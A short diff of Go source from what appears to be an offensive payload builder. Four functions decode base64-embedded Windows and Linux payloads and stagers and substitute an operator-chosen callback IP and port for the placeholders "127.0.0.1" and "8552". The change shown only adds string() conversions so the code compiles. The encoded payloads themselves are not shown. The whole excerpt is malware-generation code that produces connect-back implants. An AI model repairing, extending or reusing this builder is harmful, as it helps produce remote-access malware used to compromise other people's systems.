@@ -424,7 +424,7 @@ func GENERATE_WINDOWS_PAYLOAD() {
 
   WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WIN_PAYLOAD)
 
-  Index := strings.Replace(WINDOWS_PAYLOAD, "\"127.0.0.1\";", Payload.Ip, -1)
+  Index := strings.Replace(string(WINDOWS_PAYLOAD), "\"127.0.0.1\";", Payload.Ip, -1)
   Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
   Payload_Source.WriteString(Index)
   runtime.GC()
@@ -464,7 +464,7 @@ func GENERATE_LINUX_PAYLOAD() {
 
   Linux_Payload, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
 
-  Index := strings.Replace(Linux_Payload, "\"127.0.0.1\";", Payload.Ip, -1)
+  Index := strings.Replace(string(Linux_Payload), "\"127.0.0.1\";", Payload.Ip, -1)
   Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
   Payload_Source.WriteString(Index)
   runtime.GC()
@@ -510,7 +510,7 @@ func GENERATE_WINDOWS_STAGER_PAYLOAD() {
 
   WIN_STAGER, _ := base64.StdEncoding.DecodeString(WIN_STAGER_PAYLOAD)
 
-  Index := strings.Replace(WIN_STAGER, "\"127.0.0.1\";", Stager_Payload_Ip, -1)
+  Index := strings.Replace(string(WIN_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
   Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
   Payload_Source.WriteString(Index)
   runtime.GC()
@@ -554,7 +554,7 @@ func GENERATE_LINUX_STAGER_PAYLOAD() {
 
   LINUX_STAGER, _ := base64.StdEncoding.DecodeString(LINUX_STAGER_PAYLOAD)
 
-  Index := strings.Replace(LINUX_STAGER, "\"127.0.0.1\";", Stager_Payload_Ip, -1)
+  Index := strings.Replace(string(LINUX_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
   Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
   Payload_Source.WriteString(Index)
   runtime.GC()
